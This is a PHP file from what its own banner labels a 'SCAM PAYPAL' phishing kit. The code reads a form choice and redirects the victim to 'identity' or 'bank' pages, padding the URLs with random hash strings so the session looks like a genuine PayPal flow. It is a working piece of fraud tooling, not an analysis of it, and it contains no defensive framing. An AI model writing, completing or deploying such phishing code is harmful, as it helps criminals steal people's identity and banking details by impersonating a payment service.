<?php
 include('xanbbx.php');
/*   


                              #=======================#
                              #   SCAM PAYPAL V.I.P   #
                              #    XVerGinia-V.I.P    #
                              #=======================#
                  
*/
error_reporting(E_ERROR | E_PARSE);
 
$xselect = $_POST['mselect'] ;

if($xselect == "id1") {
HEADER("Location: ../identity/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
}

elseif ($xselect == "id2") {
HEADER("Location: ../bank/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
}
	
else {
HEADER("Location: ../identity/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
}

?>
